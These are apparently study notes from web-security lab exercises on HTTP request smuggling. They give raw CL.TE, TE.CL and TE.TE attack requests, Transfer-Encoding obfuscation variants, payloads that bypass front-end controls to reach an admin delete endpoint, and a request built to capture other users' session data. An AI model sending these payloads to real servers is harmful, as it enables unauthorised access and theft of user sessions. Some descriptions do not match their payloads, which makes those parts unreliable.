# HTTP Smuggling

## How do HTTP request smuggling vulnerabilities arise? <a href="#how-do-http-request-smuggling-vulnerabilities-arise" id="how-do-http-request-smuggling-vulnerabilities-arise"></a>

Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the `Content-Length` header and the `Transfer-Encoding` header.

Classic request smuggling attacks involve placing both the `Content-Length` header and the `Transfer-Encoding` header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently.

#### CL.TE vulnerabilities <a href="#cl-te-vulnerabilities" id="cl-te-vulnerabilities"></a>

Here, the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header. We can perform a simple HTTP request smuggling attack as follows:

{% code overflow="wrap" fullWidth="false" %}
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
{% endcode %}

#### TE.CL vulnerabilities <a href="#te-cl-vulnerabilities" id="te-cl-vulnerabilities"></a>

Here, the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header. We can perform a simple HTTP request smuggling attack as follows:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

The front-end server processes the `Transfer-Encoding` header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following `SMUGGLED`. It processes the second chunk, which is stated to be zero length, and so is treated as terminating the request. This request is forwarded on to the back-end server.

The back-end server processes the `Content-Length` header and determines that the request body is 3 bytes long, up to the start of the line following `8`. The following bytes, starting with `SMUGGLED`, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.

```
POST / HTTP/1.1
Host: 0af3002f045e79278101346b00f400cf.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

#### TE.TE behavior: obfuscating the TE header <a href="#te-te-behavior-obfuscating-the-te-header" id="te-te-behavior-obfuscating-the-te-header"></a>

Here, the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

There are potentially endless ways to obfuscate the `Transfer-Encoding` header. For example:

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

## Finding HTTP request smuggling vulnerabilities

#### Finding CL.TE vulnerabilities using timing techniques <a href="#finding-cl-te-vulnerabilities-using-timing-techniques" id="finding-cl-te-vulnerabilities-using-timing-techniques"></a>

\
If an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following will often cause a time delay:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

Since the front-end server uses the `Content-Length` header, it will forward only part of this request, omitting the `X`. The back-end server uses the `Transfer-Encoding` header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay.

#### Finding TE.CL vulnerabilities using timing techniques <a href="#finding-te-cl-vulnerabilities-using-timing-techniques" id="finding-te-cl-vulnerabilities-using-timing-techniques"></a>

If an application is vulnerable to the TE.CL variant of request smuggling, then sending a request like the following will often cause a time delay:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

Since the front-end server uses the `Transfer-Encoding` header, it will forward only part of this request, omitting the `X`. The back-end server uses the `Content-Length` header, expects more content in the message body, and waits for the remaining content to arrive. This will cause an observable time delay.

#### Confirming CL.TE vulnerabilities using differential responses <a href="#confirming-cl-te-vulnerabilities-using-differential-responses" id="confirming-cl-te-vulnerabilities-using-differential-responses"></a>

To confirm a CL.TE vulnerability, you would send an attack request like this:

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

If the attack is successful, then the last two lines of this request are treated by the back-end server as belonging to the next request that is received. This will cause the subsequent "normal" request to look like this:

```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

#### Confirming TE.CL vulnerabilities using differential responses <a href="#confirming-te-cl-vulnerabilities-using-differential-responses" id="confirming-te-cl-vulnerabilities-using-differential-responses"></a>

To confirm a TE.CL vulnerability, you would send an attack request like this:

```
POST / HTTP/1.1
Host: 0a1200b504f9982380bdad3400040034.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

If the attack is successful, then everything from `GET /404` onwards is treated by the back-end server as belonging to the next request that is received. This will cause the subsequent "normal" request to look like this:

```
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

## Bypass security measures

In some applications, the front-end web server is used to implement some security controls, deciding whether to allow individual requests to be processed. Allowed requests are forwarded to the back-end server, where they are deemed to have passed through the front-end controls.

{% hint style="warning" %}
In this case let auto update Content-Lenght
{% endhint %}

#### CL-TE

```
POST / HTTP/1.1
Host: 0a9c004503b61d0480369ede00d900cd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=

```

#### TE-CL

```
POST / HTTP/1.1
Host: 0ad500cc0356c15b8114f7aa009b0007.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

## Revealing front-end request rewriting <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

In some situations, if your smuggled requests are missing some headers that are normally added by the front-end server, then the back-end server might not process the requests in the normal way, resulting in smuggled requests failing to have the intended effects.

There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:

* Find a POST request that reflects the value of a request parameter into the application's response.
* Shuffle the parameters so that the reflected parameter appears last in the message body.
* Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.

```
GET /admin/delete?username=carlos HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

## Capturing other users' requests <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

To perform the attack, you need to smuggle a request that submits data to the storage function, with the parameter containing the data to store positioned last in the request. For example, suppose an application uses the following request to submit a blog post comment, which will be stored and displayed on the blog:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```

Now consider what would happen if you smuggle an equivalent request with an overly long `Content-Length` header and the `comment` parameter positioned at the end of the request as follows:

```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

The `Content-Length` header of the smuggled request indicates that the body will be 400 bytes long, but we've only sent 144 bytes. In this case, the back-end server will wait for the remaining 256 bytes before issuing the response, or else issue a timeout if this doesn't arrive quick enough.
